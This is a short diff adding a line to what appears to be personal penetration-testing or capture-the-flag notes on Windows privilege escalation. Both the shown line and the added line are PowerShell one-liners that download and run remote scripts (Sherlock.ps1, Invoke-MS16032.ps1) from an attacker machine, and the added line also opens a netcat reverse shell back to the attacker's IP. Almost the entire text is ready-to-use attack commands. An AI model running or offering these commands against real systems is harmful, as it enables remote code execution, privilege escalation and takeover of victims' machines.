@@ -230,6 +230,8 @@ Password Protected SSH Private Key:
 			
 	- Sherlock.ps1:
 		- Once you get it on the attacker machine, start an http server on the attacker machine and run this command on the victim: powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Sherlock.ps1'); Find-AllVulns
+	- Example of chaining commands on windows: C:\temp> C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+
 
 			
 
